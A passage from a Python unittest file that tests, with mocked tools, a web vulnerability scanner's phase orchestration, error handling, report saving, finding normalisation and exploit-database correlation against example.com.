            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = MOCK_CRAWL_RESULT
            mock_crawler_cls.return_value = mock_crawler

            # Setup fuzzer
            mock_fuzzer = MagicMock()
            mock_fuzzer.fuzz_parameter.return_value = MOCK_FUZZ_FINDINGS

            scanner = WebScanner("http://example.com", llm=MagicMock(), out_dir=Path(tmpdir))
            scanner.crawler = mock_crawler
            scanner.fuzzer = mock_fuzzer

            result = scanner.scan()

            self.assertIn("findings", result)
            self.assertIn("phases_run", result)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_scan_respects_phases_config(self, mock_client_cls, mock_crawler_cls):
        """Test scan only runs configured phases."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.save_json"):
            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = MOCK_CRAWL_RESULT
            mock_crawler_cls.return_value = mock_crawler

            scanner = WebScanner(
                "http://example.com", out_dir=Path(tmpdir),
                phases=["crawl"],
            )
            scanner.crawler = mock_crawler

            result = scanner.scan()

            self.assertIn("crawl", result["phases_run"])
            self.assertNotIn("recon", result["phases_run"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_scan_with_exploit_correlation(self, mock_client_cls, mock_crawler_cls):
        """Test scan includes exploit correlation phase."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ReconOrchestrator") as mock_recon_cls, \
             patch("packages.web.scanner.NucleiRunner") as mock_nuclei_cls, \
             patch("packages.web.scanner.ZapScanner") as mock_zap_cls, \
             patch("packages.web.scanner.ExploitSearcher") as mock_searcher_cls, \
             patch("packages.web.scanner.save_json"):
            mock_recon = MagicMock()
            mock_recon.run.return_value = MOCK_RECON_RESULT
            mock_recon_cls.return_value = mock_recon

            mock_nuclei = MagicMock()
            mock_nuclei.is_available.return_value = True
            mock_nuclei.run.return_value = MOCK_NUCLEI_RESULT
            mock_nuclei_cls.return_value = mock_nuclei

            mock_zap = MagicMock()
            mock_zap.is_available.return_value = True
            mock_zap.spider_scan.return_value = {"completed": True}
            mock_zap.active_scan.return_value = {"completed": True}
            mock_zap.get_alerts.return_value = MOCK_ZAP_ALERTS
            mock_zap_cls.return_value = mock_zap

            mock_searcher = MagicMock()
            mock_searcher.search.return_value = MOCK_EXPLOIT_RESULTS
            mock_searcher_cls.return_value = mock_searcher

            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = MOCK_CRAWL_RESULT
            mock_crawler_cls.return_value = mock_crawler

            mock_fuzzer = MagicMock()
            mock_fuzzer.fuzz_parameter.return_value = MOCK_FUZZ_FINDINGS

            scanner = WebScanner("http://example.com", llm=MagicMock(), out_dir=Path(tmpdir))
            scanner.crawler = mock_crawler
            scanner.fuzzer = mock_fuzzer

            result = scanner.scan()

            self.assertIn("correlations", result)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_scan_returns_findings_list(self, mock_client_cls, mock_crawler_cls):
        """Test scan returns a findings list."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.save_json"):
            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = MOCK_CRAWL_RESULT
            mock_crawler_cls.return_value = mock_crawler

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir), phases=["crawl"])
            scanner.crawler = mock_crawler

            result = scanner.scan()

            self.assertIsInstance(result["findings"], list)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_scan_empty_phases_no_action(self, mock_client_cls, mock_crawler_cls):
        """Test scan with empty phases list does nothing."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.save_json"):
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir), phases=[])
            result = scanner.scan()

            self.assertEqual(result["phases_run"], [])
            self.assertEqual(result["findings"], [])


class TestErrorHandling(unittest.TestCase):
    """Test error handling and graceful degradation."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_recon_phase_failure_doesnt_break_scan(self, mock_client_cls, mock_crawler_cls):
        """Test recon failure doesn't break the full scan."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ReconOrchestrator") as mock_recon_cls, \
             patch("packages.web.scanner.save_json"):
            mock_recon = MagicMock()
            mock_recon.run.side_effect = RuntimeError("recon failed")
            mock_recon_cls.return_value = mock_recon

            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = MOCK_CRAWL_RESULT
            mock_crawler_cls.return_value = mock_crawler

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner.crawler = mock_crawler

            result = scanner.scan()

            # Scan should complete despite recon failure
            self.assertIn("findings", result)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_nuclei_phase_failure_doesnt_break_scan(self, mock_client_cls, mock_crawler_cls):
        """Test nuclei failure doesn't break the full scan."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.NucleiRunner") as mock_nuclei_cls, \
             patch("packages.web.scanner.save_json"):
            mock_nuclei = MagicMock()
            mock_nuclei.is_available.side_effect = RuntimeError("nuclei crashed")
            mock_nuclei_cls.return_value = mock_nuclei

            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = MOCK_CRAWL_RESULT
            mock_crawler_cls.return_value = mock_crawler

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner.crawler = mock_crawler

            result = scanner.scan()

            self.assertIn("findings", result)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_zap_phase_failure_doesnt_break_scan(self, mock_client_cls, mock_crawler_cls):
        """Test ZAP failure doesn't break the full scan."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ZapScanner") as mock_zap_cls, \
             patch("packages.web.scanner.save_json"):
            mock_zap = MagicMock()
            mock_zap.is_available.side_effect = RuntimeError("ZAP crashed")
            mock_zap_cls.return_value = mock_zap

            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = MOCK_CRAWL_RESULT
            mock_crawler_cls.return_value = mock_crawler

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner.crawler = mock_crawler

            result = scanner.scan()

            self.assertIn("findings", result)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_crawl_phase_failure_doesnt_break_scan(self, mock_client_cls, mock_crawler_cls):
        """Test crawl failure doesn't break the full scan."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.save_json"):
            mock_crawler = MagicMock()
            mock_crawler.crawl.side_effect = RuntimeError("crawl failed")
            mock_crawler_cls.return_value = mock_crawler

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner.crawler = mock_crawler

            result = scanner.scan()

            # Should complete, with crawl result marked as failed
            self.assertIn("findings", result)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_fuzz_phase_failure_doesnt_break_scan(self, mock_client_cls, mock_crawler_cls):
        """Test fuzz failure doesn't break the full scan."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.save_json"):
            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = MOCK_CRAWL_RESULT
            mock_crawler_cls.return_value = mock_crawler

            mock_fuzzer = MagicMock()
            mock_fuzzer.fuzz_parameter.side_effect = RuntimeError("fuzz failed")

            scanner = WebScanner("http://example.com", llm=MagicMock(), out_dir=Path(tmpdir))
            scanner.crawler = mock_crawler
            scanner.fuzzer = mock_fuzzer

            result = scanner.scan()

            self.assertIn("findings", result)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_correlate_phase_failure_doesnt_break_scan(self, mock_client_cls, mock_crawler_cls):
        """Test correlate failure doesn't break the full scan."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ReconOrchestrator") as mock_recon_cls, \
             patch("packages.web.scanner.NucleiRunner") as mock_nuclei_cls, \
             patch("packages.web.scanner.ZapScanner") as mock_zap_cls, \
             patch("packages.web.scanner.ExploitSearcher") as mock_searcher_cls, \
             patch("packages.web.scanner.save_json"):
            mock_recon = MagicMock()
            mock_recon.run.return_value = MOCK_RECON_RESULT
            mock_recon_cls.return_value = mock_recon

            mock_nuclei = MagicMock()
            mock_nuclei.is_available.return_value = True
            mock_nuclei.run.return_value = MOCK_NUCLEI_RESULT
            mock_nuclei_cls.return_value = mock_nuclei

            mock_zap = MagicMock()
            mock_zap.is_available.return_value = True
            mock_zap.spider_scan.return_value = {"completed": True}
            mock_zap.active_scan.return_value = {"completed": True}
            mock_zap.get_alerts.return_value = MOCK_ZAP_ALERTS
            mock_zap_cls.return_value = mock_zap

            mock_searcher = MagicMock()
            mock_searcher.search.side_effect = RuntimeError("exploit DB failed")
            mock_searcher_cls.return_value = mock_searcher

            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = MOCK_CRAWL_RESULT
            mock_crawler_cls.return_value = mock_crawler

            mock_fuzzer = MagicMock()
            mock_fuzzer.fuzz_parameter.return_value = MOCK_FUZZ_FINDINGS

            scanner = WebScanner("http://example.com", llm=MagicMock(), out_dir=Path(tmpdir))
            scanner.crawler = mock_crawler
            scanner.fuzzer = mock_fuzzer

            result = scanner.scan()

            # Should complete despite correlate failure
            self.assertIn("findings", result)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_partial_results_with_some_phases_failing(self, mock_client_cls, mock_crawler_cls):
        """Test scan returns partial results when some phases fail."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ReconOrchestrator") as mock_recon_cls, \
             patch("packages.web.scanner.save_json"):
            mock_recon = MagicMock()
            mock_recon.run.side_effect = RuntimeError("recon failed")
            mock_recon_cls.return_value = mock_recon

            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = MOCK_CRAWL_RESULT
            mock_crawler_cls.return_value = mock_crawler

            scanner = WebScanner(
                "http://example.com", out_dir=Path(tmpdir),
                phases=["recon", "crawl"],
            )
            scanner.crawler = mock_crawler

            result = scanner.scan()

            self.assertIn("crawl", result["phases_run"])
            self.assertIn("findings", result)


class TestReportGeneration(unittest.TestCase):
    """Test report generation and saving."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_save_report_creates_file(self, mock_client_cls, mock_crawler_cls):
        """Test save_report creates a JSON file."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = [MOCK_FINDING_NUCLEI]
            scanner._phase_results = {"nuclei": MOCK_NUCLEI_RESULT}

            report_path = scanner.save_report()

            self.assertTrue(Path(report_path).exists())

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_save_report_contains_findings(self, mock_client_cls, mock_crawler_cls):
        """Test saved report contains findings."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = [MOCK_FINDING_NUCLEI, MOCK_FINDING_ZAP]
            scanner._phase_results = {
                "nuclei": MOCK_NUCLEI_RESULT,
                "zap": {"alerts": MOCK_ZAP_ALERTS},
            }

            report_path = scanner.save_report()

            data = json.loads(Path(report_path).read_text())
            self.assertEqual(len(data["findings"]), 2)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_save_report_includes_metadata(self, mock_client_cls, mock_crawler_cls):
        """Test saved report includes target and metadata."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = []
            scanner._phase_results = {}

            report_path = scanner.save_report()

            data = json.loads(Path(report_path).read_text())
            self.assertEqual(data["target"], "http://example.com")

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_save_report_includes_phase_results(self, mock_client_cls, mock_crawler_cls):
        """Test saved report includes raw phase results."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = []
            scanner._phase_results = {"recon": MOCK_RECON_RESULT}

            report_path = scanner.save_report()

            data = json.loads(Path(report_path).read_text())
            self.assertIn("recon", data["phase_results"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_save_report_returns_path(self, mock_client_cls, mock_crawler_cls):
        """Test save_report returns a Path object."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = []
            scanner._phase_results = {}

            result = scanner.save_report()

            self.assertIsInstance(result, Path)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_save_report_includes_correlations(self, mock_client_cls, mock_crawler_cls):
        """Test saved report includes exploit correlations."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = [MOCK_FINDING_NUCLEI]
            scanner._phase_results = {"nuclei": MOCK_NUCLEI_RESULT}
            scanner._correlations = MOCK_EXPLOIT_RESULTS

            report_path = scanner.save_report()

            data = json.loads(Path(report_path).read_text())
            self.assertIn("exploit_correlations", data)


class TestToolAvailability(unittest.TestCase):
    """Test graceful degradation when tools are missing."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_recon_unavailable_returns_error(self, mock_client_cls, mock_crawler_cls):
        """Test run_recon returns error dict when tool unavailable."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ReconOrchestrator", side_effect=ImportError):
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_recon("example.com")

            self.assertFalse(result["success"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_nuclei_unavailable_returns_error(self, mock_client_cls, mock_crawler_cls):
        """Test run_nuclei returns error dict when tool unavailable."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.NucleiRunner", side_effect=ImportError):
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_nuclei(["https://example.com"])

            self.assertFalse(result["success"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_zap_unavailable_returns_error(self, mock_client_cls, mock_crawler_cls):
        """Test run_zap returns error dict when ZAP unavailable."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ZapScanner", side_effect=ImportError):
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            result = scanner.run_zap("https://example.com")

            self.assertFalse(result["success"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_exploit_db_unavailable_returns_empty(self, mock_client_cls, mock_crawler_cls):
        """Test correlate_findings returns empty when exploit DB unavailable."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ExploitSearcher", side_effect=ImportError):
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = [MOCK_FINDING_NUCLEI]

            result = scanner.correlate_findings()

            self.assertEqual(len(result["correlations"]), 0)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_fuzzer_none_returns_empty(self, mock_client_cls, mock_crawler_cls):
        """Test run_fuzz returns empty list when fuzzer is None."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", llm=None, out_dir=Path(tmpdir))
            self.assertIsNone(scanner.fuzzer)

            result = scanner.run_fuzz(["http://example.com"], ["param"])
            self.assertEqual(result, [])


class TestBackwardCompatibility(unittest.TestCase):
    """Test backward compatibility with old scanner interface."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_old_init_signature_still_works(self, mock_client_cls, mock_crawler_cls):
        """Test old __init__(url, llm, out_dir, verify_ssl) still works."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", None, Path(tmpdir), verify_ssl=True)
            self.assertEqual(scanner.base_url, "http://example.com")
            self.assertIsNone(scanner.llm)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_old_scan_returns_report_dict(self, mock_client_cls, mock_crawler_cls):
        """Test old scan() still returns a report dict."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.save_json"):
            mock_crawler = MagicMock()
            mock_crawler.crawl.return_value = {
                "stats": {"total_pages": 1, "total_parameters": 0},
                "discovered_parameters": [],
                "pages": [],
            }
            mock_crawler_cls.return_value = mock_crawler

            scanner = WebScanner("http://example.com", None, Path(tmpdir))
            scanner.crawler = mock_crawler

            result = scanner.scan()

            self.assertIsInstance(result, dict)
            self.assertIn("target", result)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_default_phases_all_enabled(self, mock_client_cls, mock_crawler_cls):
        """Test default phases include all phases for backward compat."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            expected = {"recon", "nuclei", "zap", "crawl", "fuzz", "correlate"}
            self.assertEqual(set(scanner.phases), expected)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_client_attribute_exists(self, mock_client_cls, mock_crawler_cls):
        """Test client attribute exists for backward compatibility."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            self.assertIsNotNone(scanner.client)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_crawler_attribute_exists(self, mock_client_cls, mock_crawler_cls):
        """Test crawler attribute exists for backward compatibility."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            self.assertIsNotNone(scanner.crawler)


class TestFindingNormalization(unittest.TestCase):
    """Test normalization helpers for converting raw tool output to unified format."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_normalize_nuclei_finding(self, mock_client_cls, mock_crawler_cls):
        """Test _normalize_nuclei_finding creates correct format."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            raw = MOCK_NUCLEI_RESULT["findings"][0]
            finding = scanner._normalize_nuclei_finding(raw)

            self.assertEqual(finding["type"], "nuclei")
            self.assertEqual(finding["severity"], "critical")
            self.assertIn("CVE-2021-44228", finding["cve"])
            self.assertIn("CWE-502", finding["cwe"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_normalize_zap_alert(self, mock_client_cls, mock_crawler_cls):
        """Test _normalize_zap_alert creates correct format."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            raw = MOCK_ZAP_ALERTS[0]
            finding = scanner._normalize_zap_alert(raw)

            self.assertEqual(finding["type"], "zap")
            self.assertEqual(finding["severity"], "high")
            self.assertEqual(finding["parameter"], "username")
            self.assertEqual(finding["cwe"], "CWE-89")

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_normalize_fuzz_finding(self, mock_client_cls, mock_crawler_cls):
        """Test _normalize_fuzz_finding creates correct format."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            raw = MOCK_FUZZ_FINDINGS[0]
            finding = scanner._normalize_fuzz_finding(raw)

            self.assertEqual(finding["type"], "fuzz")
            self.assertEqual(finding["parameter"], "username")
            self.assertEqual(finding["source"], "fuzzer")

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_risk_to_severity_mapping(self, mock_client_cls, mock_crawler_cls):
        """Test _risk_to_severity maps ZAP risk levels correctly."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            self.assertEqual(scanner._risk_to_severity("High"), "high")
            self.assertEqual(scanner._risk_to_severity("Medium"), "medium")
            self.assertEqual(scanner._risk_to_severity("Low"), "low")
            self.assertEqual(scanner._risk_to_severity("Informational"), "info")
            self.assertEqual(scanner._risk_to_severity("Unknown"), "info")


class TestExtractDomain(unittest.TestCase):
    """Test domain extraction helper."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_extract_domain_from_url(self, mock_client_cls, mock_crawler_cls):
        """Test _extract_domain extracts domain from URL."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            domain = scanner._extract_domain("https://www.example.com/path")
            self.assertEqual(domain, "www.example.com")

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_extract_domain_from_bare_domain(self, mock_client_cls, mock_crawler_cls):
        """Test _extract_domain with bare domain input."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            domain = scanner._extract_domain("example.com")
            self.assertEqual(domain, "example.com")

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_extract_domain_from_ip(self, mock_client_cls, mock_crawler_cls):
        """Test _extract_domain with IP address."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://192.168.1.1", out_dir=Path(tmpdir))
            domain = scanner._extract_domain("http://192.168.1.1:8080/api")
            self.assertEqual(domain, "192.168.1.1")


class TestCountHelpers(unittest.TestCase):
    """Test _count_by_severity and _count_by_type helpers."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_count_by_severity(self, mock_client_cls, mock_crawler_cls):
        """Test _count_by_severity groups findings correctly."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            findings = [
                {"severity": "high"}, {"severity": "high"},
                {"severity": "critical"}, {"severity": "info"},
            ]
            result = scanner._count_by_severity(findings)
            self.assertEqual(result["high"], 2)
            self.assertEqual(result["critical"], 1)
            self.assertEqual(result["info"], 1)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_count_by_type(self, mock_client_cls, mock_crawler_cls):
        """Test _count_by_type groups findings correctly."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            findings = [
                {"type": "nuclei"}, {"type": "zap"},
                {"type": "nuclei"}, {"type": "fuzz"},
            ]
            result = scanner._count_by_type(findings)
            self.assertEqual(result["nuclei"], 2)
            self.assertEqual(result["zap"], 1)
            self.assertEqual(result["fuzz"], 1)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_count_empty_findings(self, mock_client_cls, mock_crawler_cls):
        """Test count helpers with empty findings."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            self.assertEqual(scanner._count_by_severity([]), {})
            self.assertEqual(scanner._count_by_type([]), {})


class TestAggregateWithCrawlResults(unittest.TestCase):
    """Test aggregate_findings with crawl form discovery."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_aggregate_crawl_forms(self, mock_client_cls, mock_crawler_cls):
        """Test aggregate creates findings from crawl forms."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._phase_results = {"crawl": {
                "success": True,
                "discovered_forms": [
                    {"action": "https://example.com/login", "method": "POST",
                     "inputs": {"user": {"type": "text"}, "pass": {"type": "password"}}},
                ],
            }}

            findings = scanner.aggregate_findings()
            crawl_findings = [f for f in findings if f["type"] == "crawl"]
            self.assertGreater(len(crawl_findings), 0)
            self.assertIn("user", crawl_findings[0]["evidence"])

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_aggregate_handles_failed_crawl(self, mock_client_cls, mock_crawler_cls):
        """Test aggregate skips crawl when it has error."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._phase_results = {"crawl": {"success": False, "error": "network error"}}

            findings = scanner.aggregate_findings()
            crawl_findings = [f for f in findings if f["type"] == "crawl"]
            self.assertEqual(len(crawl_findings), 0)


class TestCorrelateWithExploitResults(unittest.TestCase):
    """Test correlate_findings with various exploit DB scenarios."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_correlate_multiple_cves(self, mock_client_cls, mock_crawler_cls):
        """Test correlate searches for multiple CVEs."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ExploitSearcher") as mock_searcher_cls, \
             patch("packages.web.scanner.ExploitDatabase"):
            mock_searcher = MagicMock()
            mock_searcher.search.return_value = MOCK_EXPLOIT_RESULTS
            mock_searcher_cls.return_value = mock_searcher

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = [
                MOCK_FINDING_NUCLEI,
                {**MOCK_FINDING_NUCLEI, "id": "nuclei-002", "cve": "CVE-2022-12345"},
            ]

            result = scanner.correlate_findings()

            self.assertEqual(mock_searcher.search.call_count, 2)
            self.assertGreater(len(result["correlations"]), 0)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_correlate_exploit_search_exception(self, mock_client_cls, mock_crawler_cls):
        """Test correlate handles search exceptions per-finding."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ExploitSearcher") as mock_searcher_cls, \
             patch("packages.web.scanner.ExploitDatabase"):
            mock_searcher = MagicMock()
            mock_searcher.search.side_effect = RuntimeError("search failed")
            mock_searcher_cls.return_value = mock_searcher

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = [MOCK_FINDING_NUCLEI]

            result = scanner.correlate_findings()

            self.assertEqual(len(result["correlations"]), 0)

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_correlate_exploit_db_init_exception(self, mock_client_cls, mock_crawler_cls):
        """Test correlate handles ExploitDatabase init exception."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir, \
             patch("packages.web.scanner.ExploitDatabase") as mock_db_cls, \
             patch("packages.web.scanner.ExploitSearcher"):
            mock_db_cls.side_effect = RuntimeError("db init failed")

            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._findings = [MOCK_FINDING_NUCLEI]

            result = scanner.correlate_findings()

            self.assertEqual(len(result["correlations"]), 0)


class TestNucleiAggregationWithSarif(unittest.TestCase):
    """Test nuclei result aggregation with SARIF output dir."""

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
    def test_aggregate_nuclei_with_output_dir(self, mock_client_cls, mock_crawler_cls):
        """Test aggregate uses output_dir from nuclei scan."""
        from packages.web.scanner import WebScanner
        with tempfile.TemporaryDirectory() as tmpdir:
            scanner = WebScanner("http://example.com", out_dir=Path(tmpdir))
            scanner._phase_results = {"nuclei": {
                "success": True,
                "scans": [{
                    "target": "https://example.com",
                    "success": True,
                    "stdout": "vuln found",
                    "stderr": "",
                    "_output_dir": tmpdir,
                }],
            }}

            findings = scanner.aggregate_findings()
            nuclei_findings = [f for f in findings if f["type"] == "nuclei"]
            self.assertGreater(len(nuclei_findings), 0)


class TestMainCLI(unittest.TestCase):
    """Test the main() CLI entry point."""

    @patch("packages.web.scanner.WebClient")
    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.main")
    def test_main_callable(self, mock_main, mock_client_cls, mock_crawler_cls):
        """Test main function is callable."""
        from packages.web.scanner import main
        self.assertTrue(callable(main))

    @patch("packages.web.scanner.WebCrawler")
    @patch("packages.web.scanner.WebClient")
